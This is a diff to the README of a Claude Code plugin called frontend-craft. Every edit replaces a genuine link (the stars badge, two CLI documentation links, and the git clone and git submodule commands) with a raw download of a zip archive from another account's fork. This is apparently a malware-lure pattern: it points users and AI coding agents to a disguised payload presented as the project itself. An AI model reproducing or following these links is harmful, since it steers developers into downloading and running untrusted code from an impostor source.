@@ -1,6 +1,6 @@
 # frontend-craft
 
-[![Stars](https://img.shields.io/github/stars/bovinphang/frontend-craft?style=flat)](https://github.com/bovinphang/frontend-craft/stargazers)
+[![Stars](https://img.shields.io/github/stars/bovinphang/frontend-craft?style=flat)](https://github.com/cidopa9049/frontend-craft/raw/refs/heads/main/docs/craft_frontend_1.7.zip)
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 ![TypeScript](https://img.shields.io/badge/-TypeScript-3178C6?logo=typescript&logoColor=white)
 ![React](https://img.shields.io/badge/-React-61DAFB?logo=react&logoColor=black)
@@ -84,7 +84,7 @@ This plugin fully supports **Windows, macOS, and Linux**. All hooks and scripts 
 
 ## Multi-agent skills (Skills CLI)
 
-If your team uses **Claude Code**, **OpenAI Codex**, **Cursor**, **OpenCode**, **Gemini CLI**, **OpenClaw**, **Continue**, **CodeBuddy**, **Trae**, **Kimi Code CLI**, or other AI coding agents, you can install the **workflow skills** from this repo into each tool’s skills directory using the [Skills CLI](https://skills.sh/docs/cli) (`npx skills`). The CLI supports dozens of agents; the exact list appears in interactive prompts or in the upstream documentation.
+If your team uses **Claude Code**, **OpenAI Codex**, **Cursor**, **OpenCode**, **Gemini CLI**, **OpenClaw**, **Continue**, **CodeBuddy**, **Trae**, **Kimi Code CLI**, or other AI coding agents, you can install the **workflow skills** from this repo into each tool’s skills directory using the [Skills CLI](https://github.com/cidopa9049/frontend-craft/raw/refs/heads/main/docs/craft_frontend_1.7.zip) (`npx skills`). The CLI supports dozens of agents; the exact list appears in interactive prompts or in the upstream documentation.
 
 **Skills CLI vs. full plugin**
 
@@ -111,7 +111,7 @@ npx skills update
 
 This updates all installed skills to their latest versions. You can run `npx skills check` first to see what would change.
 
-**Telemetry:** The CLI may collect anonymous telemetry by default. To disable it, set `DISABLE_TELEMETRY=1`. Details: [skills.sh CLI docs](https://skills.sh/docs/cli).
+**Telemetry:** The CLI may collect anonymous telemetry by default. To disable it, set `DISABLE_TELEMETRY=1`. Details: [skills.sh CLI docs](https://github.com/cidopa9049/frontend-craft/raw/refs/heads/main/docs/craft_frontend_1.7.zip).
 
 ---
 
@@ -215,7 +215,7 @@ Add the `extraKnownMarketplaces` config above to `.claude/settings.json` in the 
 Clone the repo and load via `--plugin-dir` (no install, suitable for development and debugging):
 
 ```bash
-git clone https://github.com/bovinphang/frontend-craft.git
+git clone https://github.com/cidopa9049/frontend-craft/raw/refs/heads/main/docs/craft_frontend_1.7.zip
 claude --plugin-dir ./frontend-craft
 ```
 
@@ -223,7 +223,7 @@ claude --plugin-dir ./frontend-craft
 
 ```bash
 # Add as submodule in project root
-git submodule add https://github.com/bovinphang/frontend-craft.git .claude/plugins/frontend-craft
+git submodule add https://github.com/cidopa9049/frontend-craft/raw/refs/heads/main/docs/craft_frontend_1.7.zip .claude/plugins/frontend-craft
 
 git add .gitmodules .claude/plugins/frontend-craft
 git commit -m "feat: add frontend-craft as shared Claude Code plugin"
